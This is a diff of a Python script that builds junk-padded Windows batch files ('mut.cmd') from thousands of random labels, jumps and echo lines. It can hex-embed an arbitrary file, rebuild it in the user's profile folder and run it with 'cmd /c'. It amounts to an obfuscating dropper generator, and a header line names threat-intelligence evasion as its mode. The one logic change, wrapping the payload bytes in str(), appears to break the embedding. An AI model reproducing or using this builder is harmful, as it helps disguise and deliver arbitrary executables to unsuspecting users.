@@ -1,3 +1,8 @@
+#  ■ Copyright (c) 2024 | Axis9 (umbrella corp. division)
+#  ■ kilitary@gmail.com  | deconf@ya.ru | https://twitter.com/CommandmentTwo  | https://vk.com/agent1348
+#  ■ bus: https://linktr.ee/kilitary
+#  ■ mode: Active Counter-TIe
+
 #  (c) kilitary@gmail.com ^ axis9 ^ umbrella division @2024 (approaching 2029)
 
 import os.path
@@ -17,6 +22,7 @@ assembled = []
 labels = {}
 used_labels = {}
 allowed = []
+overlayData = None
 
 operands_stat = {}
 debug_trace = False
@@ -44,7 +50,7 @@ def write(filename: str, code: str) -> None:
         filename (str): The name of the file to write to.
         code (str): The code to write to the file.
     """
-    
+
     code += '\r\nver\r\n'
     with open(filename, "w") as file:
         file.write("@ECHO ===========================================================\n")
@@ -136,7 +142,7 @@ def check_assembled():
                 error = True
                 break
             visited_labels.add(item)
-    
+
     if error:
         print('FAIL')
         sys.exit(-8)
@@ -147,22 +153,22 @@ def remove_unlinked_labels():
     """
     Removes any labels that are not linked to any instructions in the assembled code.
     If blackhole is True, no labels will be removed and a message will be printed.
-    
+
     :return: None
     """
     global assembled
     if blackhole:
         print(f'emit not linked labels')
         return
-    
+
     print(f'unused instructions check ... ', end='')
-    
+
     tot = len(labels)
     deleted = len(assembled)
-    
+
     assembled = [(i, d) for i, d in assembled if (d in used_labels and i is Operand.LABEL) or i is not Operand.LABEL]
     deleted -= len(assembled)
-    
+
     if deleted:
         print(f'{deleted} labels removed')
 
@@ -175,19 +181,19 @@ if __name__ == '__main__':
                         help="cpu exhaust mode (dont exclude unused instructions)", required=False)
     parser.add_argument("-m", "--max", type=int, default=15000, help="max instructions")
     args = parser.parse_args()
-    
+
     if args.debug:
         debug_trace = True
         print(f'use tracing')
-    
+
     if args.blackhole:
         blackhole = True
         print(f'blackhole mode')
-    
+
     if args.file:
         size = os.path.getsize(args.file)
         print(f'embedding "{args.file}" size: {size / 1024.0 / 1024.0:.2f} Mbytes ({size} bytes)')
-        
+
         with open(args.file, "rb") as file:
             overlayData = file.read()
             base64encodedData = str(base64.b64encode(overlayData).decode('utf-8'))
@@ -195,12 +201,12 @@ if __name__ == '__main__':
             print(f'base64 size: {size / 1024.0 / 1024.0:.2f} Mbytes  ({size} bytes)')
     else:
         print(f'dumb mode')
-    
+
     setup_allowed()
-    
+
     num_instructions = random.randint(args.max * 0.7, args.max)
     print(f'{num_instructions} instructions will be generated')
-    
+
     cur_i = 0
     for n_label in tqdm.tqdm(range(0, num_instructions - 1), desc="generating labels"):
         label = Randomer.str_generator()
@@ -208,7 +214,7 @@ if __name__ == '__main__':
         assembled.append([Operand.LABEL, label])
         cur_i += 1
         # print(f'\rgenerating labels ... {cur_i / (num_instructions - 1) * 100.0:6.2f}%', end="", flush=True)
-    
+
     # Use labels
     # print(f"\nconnecting labels ... ", end='', flush=True)
     cur_i = 0
@@ -217,7 +223,7 @@ if __name__ == '__main__':
         instruction_type = Operand.DISALLOWED
         while instruction_type not in allowed:
             instruction_type = Operand(random.randint(1, len(Operand) - 1))
-        
+
         # operands loop
         if instruction_type == Operand.GOTO:
             lbl = get_unused_label()
@@ -226,7 +232,7 @@ if __name__ == '__main__':
             ai_offset = get_unlinked_label_index()
             assembled.insert(ai_offset, [Operand.GOTO, lbl])
             mark_used_label(lbl)
-        
+
         if instruction_type == Operand.CALL:
             lbl = get_unused_label()
             if lbl is None:
@@ -234,51 +240,51 @@ if __name__ == '__main__':
             ai_offset = get_unlinked_label_index()
             assembled.insert(ai_offset, [Operand.CALL, lbl])
             mark_used_label(lbl)
-        
+
         if instruction_type == Operand.SET:
             op1 = Randomer.str_id_generator(size=random.randint(5, 10))
             op2 = Randomer.str_id_generator(size=random.randint(10, 40))
             op = op1 + '=' + op2
             ai_offset = get_random_index()
             assembled.insert(ai_offset, [Operand.SET, op])
-        
+
         if instruction_type == Operand.SETV:
             pass
-        
+
         if instruction_type == Operand.TITLE:
             op2 = Randomer.str_str_generator(size=random.randint(14, 50))
             ai_offset = get_random_index()
             if debug_trace:
                 op2 = f'(run {cur_i}/{num_instructions}) '
             assembled.insert(ai_offset, [Operand.TITLE, op2])
-        
+
         if instruction_type == Operand.ECHO:
             op = Randomer.str_str_generator(size=random.randint(2, 55))
             ai_offset = get_random_index()
             assembled.insert(ai_offset, [Operand.ECHO, op])
-        
+
         if instruction_type == Operand.REM:
             op = Randomer.str_str_generator(size=random.randint(2, 55))
             ai_offset = get_random_index()
             assembled.insert(ai_offset, [Operand.REM, op])
-        
+
         if instruction_type == Operand.COLOR:
             op1 = hex(random.randint(0, 0xf))[2:]
             op2 = hex(random.randint(0, 0xf))[2:]
             op = op1 + op2
             ai_offset = get_random_index()
             assembled.insert(ai_offset, [Operand.COLOR, op])
-        
+
         # save op's stats
         operands_stat[instruction_type] = operands_stat.get(instruction_type, 0) + 1
-        
+
         # show what
         cur_i += 1
         # print(f'\rconnecting labels ... {(cur_i / num_instructions) * 100.0:6.2f}%', end="", flush=True)
-    
+
     if overlayData is not None:
         pre = f"@echo off\ncd %USERPROFILE%\nerase hex.temp p_{args.file}\n"
-        data = hexify_data(overlayData)
+        data = hexify_data(str(overlayData))
         post = ">hex.temp (" \
                "for /f \"delims=: tokens=*\" %%A in " \
                "('findstr \"^:::\" \"%~f0\"') do echo %%A" \
@@ -288,14 +294,14 @@ if __name__ == '__main__':
         executer = f"\ncmd /c p_{args.file}\nrem erase p_{args.file}\n"
         body = pre + data + post + decoder + eraser + executer
         assembled.append([Operand.PLAIN, body])
-    
+
     assembled.append([Operand.EXIT, ''])
-    
+
     check_assembled()
     remove_unlinked_labels()
-    
+
     print(f'\nassembling code ... ', end="")
-    
+
     tot = len(assembled)
     # Create the dictionary
     instruction_map = {
@@ -313,8 +319,8 @@ if __name__ == '__main__':
     code = ''
     for instruction, data in assembled:
         code += instruction_map[instruction].format(data) + "\n"
-    
+
     print(f' done: assembled {tot} instructions')
     write('mut.cmd', code)
-    
+
     pprint(operands_stat, indent=2, compact=False)
